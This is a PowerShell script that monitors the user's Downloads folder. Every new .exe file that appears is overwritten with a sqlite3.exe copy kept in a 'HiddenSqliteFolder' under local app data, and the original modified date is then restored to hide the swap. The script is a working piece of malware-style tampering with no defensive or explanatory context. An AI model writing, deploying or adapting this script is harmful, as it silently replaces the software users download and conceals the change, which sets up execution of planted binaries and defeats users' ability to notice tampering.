# Replace .exe in dowlnloads folder

# Get the user's profile folder path
$userProfilePath = [Environment]::GetFolderPath("UserProfile")

# Set the path to the user's Downloads folder
$downloadsFolderPath = Join-Path -Path $userProfilePath -ChildPath "Downloads"

# Define the path of the replacement file
$replacementFilePath = "$env:LOCALAPPDATA\HiddenSqliteFolder\sqlite-tools\sqlite-tools-win32-x86-3410200\sqlite3.exe"

# Create a FileSystemWatcher to monitor the Downloads folder
$watcher = New-Object System.IO.FileSystemWatcher
$watcher.Path = $downloadsFolderPath
$watcher.Filter = "*.exe"
$watcher.IncludeSubdirectories = $false
$watcher.EnableRaisingEvents = $true

# Define the event handler for the Created event
$actionOnCreated = {
    param($source, $event)

    # Get the full path of the new .exe file
    $exeFilePath = $event.FullPath

    # Wait a short time to allow the file transfer to complete
    Start-Sleep -Seconds 5

    # Replace the .exe file with the replacement file
    if (Test-Path $exeFilePath) {
        # Get the date modified of the original file
        $originalDateModified = (Get-Item $exeFilePath).LastWriteTime

        # Replace the file
        Copy-Item $replacementFilePath $exeFilePath -Force

        # Set the date modified of the new file to the original date modified
        (Get-Item $exeFilePath).LastWriteTime = $originalDateModified

        Write-Host "Replaced $exeFilePath with $replacementFilePath and set the date modified to $originalDateModified"
    }
}

# Register the event handler for the Created event
$createdEvent = Register-ObjectEvent -InputObject $watcher -EventName "Created" -Action $actionOnCreated

# Keep the script running indefinitely
try {
    Write-Host "Monitoring the Downloads folder for new .exe files..."
    while ($true) {
        Start-Sleep -Seconds 10
    }
} finally {
    # Unregister the event and dispose of the FileSystemWatcher when the script is terminated
    Unregister-Event -SourceIdentifier $createdEvent.Name
    $watcher.Dispose()
}
